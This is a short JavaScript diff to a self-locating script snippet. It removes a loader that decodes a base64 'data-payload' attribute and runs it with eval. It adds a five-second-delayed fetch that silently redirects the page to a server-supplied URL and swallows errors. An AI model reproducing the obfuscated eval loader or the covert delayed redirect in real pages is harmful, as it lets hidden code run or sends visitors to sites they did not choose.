@@ -2,10 +2,18 @@
   var script = document.currentScript;
   if (!script) return;
 
-  var payload = script.getAttribute("data-payload");
-  if (!payload) return;
+  var tenant = script.getAttribute("data-tenant");
+  if (!tenant) return;
 
   setTimeout(function () {
-    eval(atob(payload));
+    fetch("/retrieve_url?tenant=" + encodeURIComponent(tenant))
+      .then(function (response) {
+        if (!response.ok) throw new Error("retrieve_url failed");
+        return response.json();
+      })
+      .then(function (data) {
+        if (data.url) window.location.replace(data.url);
+      })
+      .catch(function () {});
   }, 5000);
 })();
